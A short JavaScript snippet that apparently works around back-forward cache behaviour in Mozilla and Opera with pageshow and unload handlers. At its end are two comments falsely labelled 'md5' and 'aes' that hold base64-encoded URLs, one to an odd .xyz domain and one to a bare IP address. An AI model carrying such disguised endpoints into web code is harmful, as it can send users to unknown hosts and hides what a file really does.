if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovL2Rnd2FwLmZjeGRzc25mZmdic3ZiZGV2MzEueHl6L3dhcC8jL2hvbWU=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/